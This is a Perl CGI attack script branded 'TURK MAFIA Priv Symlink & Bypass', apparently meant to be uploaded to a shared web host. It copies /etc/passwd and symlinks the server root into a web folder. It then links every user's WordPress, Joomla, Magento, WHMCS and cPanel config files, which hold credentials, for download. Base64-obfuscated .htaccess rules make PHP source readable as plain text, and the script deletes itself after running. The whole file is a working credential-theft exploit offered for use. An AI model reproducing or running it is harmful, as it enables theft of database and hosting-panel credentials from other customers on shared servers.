#!/usr/bin/perl -I/usr/local/bandmin
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#
#		Name : TURK MAFIA Priv Symlink & Bypass
#		http://facebook.com/pr0ph3ttr
#		
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 

use File::Copy;
use strict;
use warnings;
use MIME::Base64;
copy("/etc/passwd","passwd.txt") ;
mkdir "pr0_sym";
symlink("/","pr0_sym/root");
my $filename = 'passwd.txt';
my $htaccess = decode_base64("T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBpbmRveHBsb2l0Lmh0bQ0KQWRkVHlwZSB0ZXh0L3BsYWluIC5waHAgDQpBZGRIYW5kbGVyIHRleHQvcGxhaW4gLnBocA0KU2F0aXNmeSBBbnkNCkluZGV4T3B0aW9ucyArQ2hhcnNldD1VVEYtOCArRmFuY3lJbmRleGluZyArSWdub3JlQ2FzZSArRm9sZGVyc0ZpcnN0ICtYSFRNTCArSFRNTFRhYmxlICtTdXBwcmVzc1J1bGVzICtTdXBwcmVzc0Rlc2NyaXB0aW9uICtOYW1lV2lkdGg9KiANCkFkZEljb24gJ2RhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQkFBQUFBUUNBWUFBQUFmOC85aEFBQUFCSE5DU1ZRSUNBZ0lmQWhraUFBQUFBbHdTRmx6QUFBTjF3QUFEZGNCUWlpYmVBQUFBQmwwUlZoMFUyOW1kSGRoY21VQWQzZDNMbWx1YTNOallYQmxMbTl5WjV2dVBCb0FBQUZVU1VSQlZEaU5wWks5U2dOQkZJWFB2WE5uZGpjUm9wWDRVNGtXVnI1QUNoVTdIOEJTZkl0QUhrQjlDWHNyVzBHd0VRdFJ3VktNUnRBVThaY1lXYU5tTTJPeHF5eWlZWmRjR0lhWjRaNzdNZWVRY3c2REZBL1VEVUFBWUhIajhoT0FUajlvUlNlMloxZjJLalAxZmdMa25NUFM1bFcwVmk0cFpvcHZIWERXK0loT3I5OWdYVHprcjlxdlRCTXRyTmQ4QXNMVmNvbVpLRFA2MWtFTGloR0lKOVFCZ08yamRzSUUvSmI1T2FjR0ZBd0RRRWVNRU9abmgxRXFNQ2h0U0I4YTY0QlcyTU5oN1FWaWhDR0tjTkhzd21aMGxBa1lIeEY0UWhCUENLSVlSVTlsNjA1S21HQ0VJVVl6dENZTUJma0VqR1o0T2lId1JRRit2a1FHK3B0QUNJRlJFSlZQUUF2RmYrQnJqb3lRK0NaZnFxMTE4RFJGRWhqZWJiYmVsNmRHaXlUcWYrdlNya2FSUS8wdXRMN21IWGw5dnErZVAzVW5iaC9INWdES2lPRjY3WWViWTBkU0pjUkJtMHoyckZsMnlXcDhBVkRJVzMyZGE3cExBQUFBQUVsRlRrU3VRbUNDJyBeXkRJUkVDVE9SWV5eDQpEZWZhdWx0SWNvbiAnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCQUFBQUFRQ0FZQUFBQWY4LzloQUFBQUFYTlNSMElBcnM0YzZRQUFBQVppUzBkRUFQOEEvd0Qvb0wybmt3QUFBQWx3U0ZsekFBQUxFd0FBQ3hNQkFKcWNHQUFBQUFkMFNVMUZCOW9KQmhjVEp2MkIyZDRBQUFKTVNVUkJWRGpMYlpPOVRoeFpFSVcvcWx2ZHRNMzhCTmdKUW1RZ0pHZCtBL01RQkx3R2ppd0gzbndka1NMdE8yeEVSRzVMcXhYUlNJUjJZRGZENEdrR00wUDNyYjRiOVBBejBsN3BTbFdsVzBmbm5Mb2xBSVBCNFBYaDRlRnVudWNBSUlMd2RFU2VaeUFpZm5wNit1OW9OTG8zZ00zTnpUZEhSKy8venZKTXpTeUpLS29kaUlnOEFYYXhlSXoxYkRaN014cU5mdGdTVVJEV3k3TFVuWjBkWW14QUZBVkVsSTZBRUN5Z0lzUVFzaXpMQk9BQkFET2pLQXBxaDd1N0dvQ1VXaXdZYmV0b1VIcnJQY3dDcW9GMktVZVhMekV6QnYwK3VRbVNITUVaOUY2U1pjcjZpNElzQk9hL2I3SFFNYUh0SUF3Z0xkSGFsREExZXYwZVFiU2pyRXJRd0pwcUY0ZUF4L2hvcUQxMzJtTWtKcmk1dVNPbEZoRWhwVVFJaW9qd2FtT0ROc2xqZlVXQ3FwTG5PYWFDU0tKdG5hQkNzWllqQWxsbVhJNHZhZW9hVlgwY2JTZGhtVVIzekFLdk5qWTZWaW9vMHRXemdFb25LYlcrS2tHV3QzVW50MENlR2ZKczlnK1VVMHJFR0hIL0h3L01qSDYvVCtQT2RGb1JOS0NoTTIyeG1PUGVzcGpQR1E2SHBOUTI3dDZzQUNEU05hbnlvbGpETEVkVmFGT0xlOFprVWpLNXVrcTN0NzlsUEM3L09EazVHYStZNk81TXF5bU53M1YxeTNoeXpmWDBocXZKTHliWEZkKytmMmQzZDBkbXMrcXZnNE9EejhmSHgwL0xzYmUzOTY0c1M3KzR1RWp1bnBxbVNlNmUzRDNONS9OMFdaYnRseTlmMDluWjJaL2IyOXYyZkxFZXZ2SzlxdjdjMnRvS2k4VWlpUWlxSGJtNnJpVzZhMTNmbit6djczK29xb3JoY0xnS1VGWFZQK2ZuNTIrTG9uajhJTEowUDhaSUNDRjkvUFRwQ2xocEJ2Z1BlbG9MOVU1NU5JQUFBQUFBU1VWT1JLNUNZSUk9Jw0KSW5kZXhJZ25vcmUgKi50eHQ0MDQNCkluZGV4U3R5bGVTaGVldCAnaHR0cDovL2V2ZW50LmluZG94cGxvaXQub3IuaWQvc3ltbGluay5jc3MnDQpSZXdyaXRlRW5naW5lIE9uDQpSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9IF4uKjB4c3ltNDA0IFtOQ10NClJld3JpdGVSdWxlIFwudHh0JCAle1JFUVVFU1RfVVJJfTQwNCBbTCxSPTMwMi5OQ10=");
my $sym = decode_base64("T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBpbmRveHBsb2l0Lmh0bQ0KSGVhZGVyTmFtZSAweDE5OTkudHh0DQpTYXRpc2Z5IEFueQ0KSW5kZXhPcHRpb25zIElnbm9yZUNhc2UgRmFuY3lJbmRleGluZyBGb2xkZXJzRmlyc3QgTmFtZVdpZHRoPSogRGVzY3JpcHRpb25XaWR0aD0qIFN1cHByZXNzSFRNTFByZWFtYmxlDQpJbmRleElnbm9yZSAqDQpJbmRleFN0eWxlU2hlZXQgJ2h0dHA6Ly9ldmVudC5pbmRveHBsb2l0Lm9yLmlkL3N5bWxpbmsuY3NzJw==");
open(my $fh1, '>', 'pr0_sym/.htaccess');
print $fh1 "$htaccess";
close $fh1;
open(my $xx, '>', 'pr0_sym/nemu.txt');
print $xx "$sym";
close $xx;
open(my $fh, '<:encoding(UTF-8)', $filename);
while (my $row = <$fh>) {
my @matches = $row =~ /(.*?):x:/g;
my $usernya = $1;
my @array = (
	{configdir => '/home/'.$usernya.'/.accesshash', type => 'WHM-accesshash' },
	{configdir => '/home/'.$usernya.'/public_html/config/koneksi.php', type => 'Lokomedia' },
	{configdir => '/home/'.$usernya.'/public_html/config/settings.inc.php', type => 'PrestaShop' },
	{configdir => '/home/'.$usernya.'/public_html/app/etc/local.xml', type => 'Magento' },
	{configdir => '/home/'.$usernya.'/public_html/admin/config.php', type => 'OpenCart' },
	{configdir => '/home/'.$usernya.'/public_html/application/config/database.php', type => 'Ellislab' },
	{configdir => '/home/'.$usernya.'/public_html/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/wp/test/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/blog/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/beta/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/portal/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/site/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/wp/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/WP/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/news/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/wordpress/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/test/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/demo/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/home/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/v1/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/v2/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/press/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/new/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/blogs/wp-config.php', type => 'Wordpress' },
	{configdir => '/home/'.$usernya.'/public_html/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/blog/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/submitticket.php', type => '^WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/cms/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/beta/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/portal/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/site/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/main/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/home/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/demo/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/test/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/v1/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/v2/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/joomla/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/new/configuration.php', type => 'Joomla' },
	{configdir => '/home/'.$usernya.'/public_html/WHMCS/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/whmcs1/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Whmcs/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/whmcs/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/whmcs/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/WHMC/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Whmc/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/whmc/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/WHM/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Whm/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/whm/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/HOST/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Host/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/host/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/SUPPORTES/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Supportes/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/supportes/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/domains/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/domain/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Hosting/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/HOSTING/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/hosting/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/CART/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Cart/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/cart/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/ORDER/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Order/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/order/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/CLIENT/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Client/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/client/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/CLIENTAREA/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Clientarea/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/clientarea/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/SUPPORT/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Support/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/support/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/BILLING/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Billing/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/billing/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/BUY/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Buy/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/buy/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/MANAGE/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Manage/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/manage/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/CLIENTSUPPORT/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/ClientSupport/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Clientsupport/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/clientsupport/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/CHECKOUT/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Checkout/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/checkout/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/BILLINGS/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Billings/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/billings/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/BASKET/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Basket/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/basket/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/SECURE/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Secure/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/secure/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/SALES/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Sales/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/sales/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/BILL/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Bill/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/bill/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/PURCHASE/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Purchase/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/purchase/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/ACCOUNT/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Account/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/account/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/USER/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/User/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/user/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/CLIENTS/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Clients/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/clients/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/BILLINGS/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/Billings/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/billings/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/MY/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/My/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/my/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/secure/whm/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/secure/whmcs/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/panel/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/clientes/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/cliente/submitticket.php', type => 'WHMCS' },
	{configdir => '/home/'.$usernya.'/public_html/support/order/submitticket.php', type => 'WHMCS' }
);
foreach (@array){
	my $confignya = $_->{configdir};
	my $typeconfig = $_->{type};
	symlink("$confignya","pr0_sym/$usernya-$typeconfig.txt");
	mkdir "pr0_sym/$usernya-$typeconfig.txt";
	symlink("$confignya","pr0_sym/$usernya-$typeconfig.txt/0x1999.txt");
	copy("pr0_sym/nemu.txt","pr0_sym/$usernya-$typeconfig.txt/.htaccess") ;
	}
}
print "Content-type: text/html\n\n";
print "<head><title>Bypass 404 By Pr0ph3t</title></head>";
print '<meta http-equiv="refresh" content="3; url=pr0_sym"/>';
print '<body><center><h1>TURK MAFIA NEWER DOING WRONG</h1>';
print '<a href="pr0_sym">Click Me</a>';
unlink($0);
